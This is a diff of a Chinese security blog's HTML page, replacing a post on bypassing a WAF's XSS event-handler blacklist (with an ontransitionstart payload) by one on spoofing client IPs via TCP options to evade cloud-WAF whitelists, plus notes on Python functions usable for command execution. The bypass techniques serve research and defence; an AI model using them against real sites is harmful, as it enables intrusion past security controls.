+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
+<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%BA%93%E7%9A%84ReDos%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1286,7 +1316,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1299,7 +1329,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/" class="post-title-link" itemprop="url">WAF攻防实践(4)</a>
+          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/" class="post-title-link" itemprop="url">WAF攻防实践(5)</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1323,63 +1353,63 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>上周在做安全测试时，发现站点的xss能够插入标签，当我想用on事件来执行javascript脚本时，发现被waf拦截了。</p>
-<p>经常怼waf的，应该会碰到过，waf针对标签on属性名的拦截策略分为两种：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到: 攻击者可以利用”TOA模块”伪造客户端ip，如果厂商有ip白名单，攻击者就有可能绕过WAF的防护。</p>
+<p>按照我的理解，因为这种攻击方式可以用来伪造源ip，所以它不仅可以用来绕过WAF，还适用于”存在白名单ip防御措施”的场景，比如当后台管理系统只能”白名单ip”访问。</p>
+<p>当然这种绕过方式也有一定的前置条件，而且我感觉满足条件的攻击场景应该不多，所以这种绕过方式出现概率应该不高。</p>
+<p>建议读者先看一下原文的六页ppt，再来看我这篇”学习总结”。相比于原文，我补充了”测试脚本”和”测试时需要注意的两个小坑”，希望能节约读者测试验证时花费的时间。</p>
+<p>本文主要研究以下问题：</p>
 <ul>
-<li>on属性名在黑名单列表</li>
-<li>以on开头，且满足其他条件，比如字符串长度大于一定长度</li>
+<li>TOA是什么？</li>
+<li>怎么测试目标是否存在这类问题？</li>
 </ul>
-<p>举个例子，payload包含<code>&lt;div onXXXXX=alert(1)&gt;</code>时，按照第一种策略，只有<code>onXXXXX</code>在黑名单列表中，才会被拦截。第二种策略就直接拦截了，因为<code>onXXXXX</code>以<code>on</code>开头，且还比较长。</p>
-<p>本文碰到的waf拦截策略是第一种，所以只要找到一个on属性不在黑名单列表中，就应该可以绕过。</p>
-<p>所以问题变成了：</p>
+<p>我在这个案例学到了一些小的知识点：</p>
 <ul>
-<li>怎么找到所有的on属性？</li>
-<li>怎么判断哪个on属性没有被过滤？</li>
-<li>怎么利用未过滤的on事件？</li>
+<li>tcp报文的options字段的格式</li>
+<li>企业中怎么获取真实 client ip</li>
+<li>怎么用scapy发送带seq、ack序号的报文</li>
 </ul>
 <h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么找到所有的on属性？</p>
-<p>前端遍历BOM对象document的属性即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let results &#x3D; []</span><br><span class="line">for (let i in document)&#123;</span><br><span class="line">  if(i.startsWith(&quot;on&quot;))&#123;</span><br><span class="line">    results.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(results)</span><br><span class="line">localStorage.onAttrs&#x3D;JSON.stringify(results)</span><br></pre></td></tr></table></figure>
-
-<p>因为results字符串非常长，会在chrome控制台会被截断，所以把它存到localStorage中，结果在 Chrome devtool -&gt; Application -&gt; Storage 中可以找到。</p>
-</li>
-<li><p>怎么判断哪个on属性没有被过滤？</p>
-<p>用burpsuite的intruder爆破模块过一遍，发现有两个属性没有拦截：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ontransitionstart</span><br><span class="line">onbeforexrselect</span><br></pre></td></tr></table></figure>
-
-<p>这两个属性我之前也没见过，那怎么利用这两个属性执行js呢？</p>
-</li>
-<li><p>怎么利用<code>ontransitionstart</code>属性？</p>
-<p>根据<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/transitionstart_event">MDN-transitionstart文档</a>构造出利用方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;transition&quot; ontransitionstart&#x3D;&quot;alert(1)&quot;&gt;Hover over me&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.transition &#123;</span><br><span class="line">  width: 10000px;</span><br><span class="line">  height: 10000px;</span><br><span class="line">  background: rgba(255,0,0,1);</span><br><span class="line">  transition-property: transform, background;</span><br><span class="line">  transition-duration: 1s;</span><br><span class="line">  transition-delay: 1s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.transition:hover &#123;</span><br><span class="line">  transform: rotate(90deg);</span><br><span class="line">  background: rgba(255,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
-
-<p>虽然文档写的chrome和firefox都支持transitionstart事件，但是上面的利用payload实际测试结果：</p>
+<li><p>TOA是什么？</p>
+<p>是”TCP_option_address”的缩写；它和”X-Forwarded-For”一样，可以用来传递真实的”客户端ip”。</p>
 <blockquote>
-<p>firefox可以、chrome不行</p>
+<p>两者的区别在于：”X-Forwarded-For”工作在”应用层”，”TOA”工作在”tcp层”</p>
 </blockquote>
-<p>chrome用addEventListener可以监听<code>transitionstart</code>事件，但不能用<code>ontransitionstart</code>来监听事件。这个原因不知道为啥。</p>
-</li>
-<li><p>怎么利用<code>onbeforexrselect</code>属性？</p>
-<p>根据<a target="_blank" rel="noopener" href="https://immersive-web.github.io/dom-overlays/">onbeforexrselect文档</a>来看，似乎<code>beforexrselect</code>事件还只是一个草案。</p>
-<p>也因为transitionstart事件已经能利用了，所以也没有再研究。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li><p>从防守方来看，如果采用了on事件黑名单，就需要保证事件黑名单的全面。</p>
-</li>
-<li><p>chrome和firefox on属性有区别，或许可以作为一个区分浏览器的指纹特征（虽然感觉很不稳定）。</p>
-</li>
-<li><p>测试过程中，我还有一个疑问：不同元素之间的on属性是否会不同，比如div元素和document元素遍历出来的on属性是否会不同。有知道答案的读者可以后台告诉我。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hollake/article/details/89327474">Tcp Options字段</a>可以包含<em>不固定数量</em>个下面这样的数据结构：</p>
+<blockquote>
+<p>Kind(1字节)   |  Length(1字节,可选)  | Info(n字节,可选)</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/1846319/129451573-252bb058-f3db-40ef-abe1-001863eb1b81.png" alt="image"></p>
 </li>
 </ul>
-<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>我个人把防火墙的绕过分为两个类别：</p>
 <ul>
-<li>架构层面的绕过，这种绕过不太关心具体的漏洞类型是xss还是sql注入</li>
-<li>漏洞类型相关的绕过</li>
+<li><p>怎么用”TOA”实现传递客户端ip呢？</p>
+<p>有”转发服务”和”后端真实服务器”两个角色。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/129451679-2e631ddf-c1b0-433a-afbe-fedc777fb9b2.png" alt="image"></p>
+<p>“转发服务”在tcp包的options字段塞入真实的”客户端ip”。</p>
+<p>在”后端真实服务器”安装一些”内核模块”后，应用程序就可以用getpeername、accept等系统调用拿到真实的”客户端ip”。这些”内核模块”(比如<a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>)hook了用来接受包的内核函数。当收到数据包时，它们会遍历tcp包的options字段，然后取出真实的”客户端ip”，最终返回给应用层。</p>
+</li>
+<li><p>怎么绕过WAF？</p>
+<p>在云waf架构中，一个http请求的数据流是：客户端(浏览器) -&gt; 转发服务(bgw) -&gt; waf检测集群 -&gt; 源站。</p>
+<p>其中waf检测集群拿到的”客户端ip”是”转发服务”处理后的。</p>
+<p>如果客户端发包时在tcp包的options字段加入伪造的客户端ip和端口，且”转发服务”没有检查tcp包的options字段中是否有伪造的”客户端ip”，就会导致”waf检测集群”拿到伪造的客户端ip和端口。</p>
+<p>如果有对来源ip做白名单机制，就会存在绕过。</p>
+</li>
+<li><p>怎么测试目标是否存在这类问题？</p>
+<p>针对云waf可以这么测试：客户端发攻击包同时伪造来源ip，然后在控制台查看拦截日志。如果拦截日志中的攻击源ip不是真实ip，就说明存在问题。</p>
+<p>客户端发包代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/03bc78c6d6badaa5a80eddf684bccf0e">gist</a></p>
+<p>其中有两点需要注意：</p>
+<blockquote>
+<p>系统收到服务端的syn-ack包时，因为网络连接不存在，所以会回复一个rst包。这会影响测试，因此测试前要屏蔽掉回复的rst包。</p>
+<p>在伪造ip时，tcp options需要和测试目标”后端真实服务器”用的数据结构相同。这个数据结构可以参考 <a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>。</p>
+</blockquote>
+<p>另外建议在客户端抓包看下流量是否符合预期，以下是我测试时抓包的数据，可以看到tcp options字段已经有了我设置的”kind是238的数据”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump host 120.92.15.189</span><br><span class="line">...</span><br><span class="line">17:27:08.411615 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [S], seq 0, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.462963 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [S.], seq 4179803533, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.496708 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [.], seq 1:50, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 49: HTTP: GET &#x2F;?a&#x3D;..&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1</span><br><span class="line">17:27:08.548138 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], ack 50, win 29200, length 0</span><br><span class="line">17:27:08.550722 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], seq 1:513, ack 50, win 29200, length 512: HTTP: HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
-<p>第一种架构层面的绕过姿势比较难找，这种较为通用的绕过姿势，从攻击队视角来看我觉得比较适合扫描器来绕过防火墙。这也是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么</a>系列文章名称的由来。</p>
-<p>后面就都写到这个”waf攻防实践”系列里来。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>厂商只要转发包时，抹去所有tcp options字段 或者 检查tcp opitons有没有奇怪的kind，就可以避免这个问题，这也是我觉得这种问题出现概率不高的原因。我没有对很多厂商做测试，如果大家有啥新发现，可以公众号后台私信我。</p>
+<p>另外我把数据包文件放在了<a target="_blank" rel="noopener" href="https://github.com/leveryd/picture/blob/main/test.pcap">test.pcap</a>，如果对tcp options格式字段有疑问，就可以用wireshark打开数据包看看。</p>
+<p>留给读者一个问题：nmap -S 参数也能伪造源ip，它和本文这种方式有什么区别呢？</p>
 
       
     </div>
